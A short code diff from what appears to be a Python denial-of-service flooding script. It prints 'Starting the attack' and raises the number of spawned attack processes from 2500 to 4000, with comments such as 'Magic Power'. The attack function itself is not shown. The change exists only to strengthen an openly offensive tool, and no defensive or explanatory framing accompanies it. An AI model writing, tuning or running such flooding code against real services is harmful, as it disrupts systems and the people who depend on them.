@@ -50,7 +50,7 @@ print("[>>>] Starting the attack [<<<]")
 sleep(0)
 
 def send2attack():
-  for i in range(2500): #Magic Power
+  for i in range(4000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
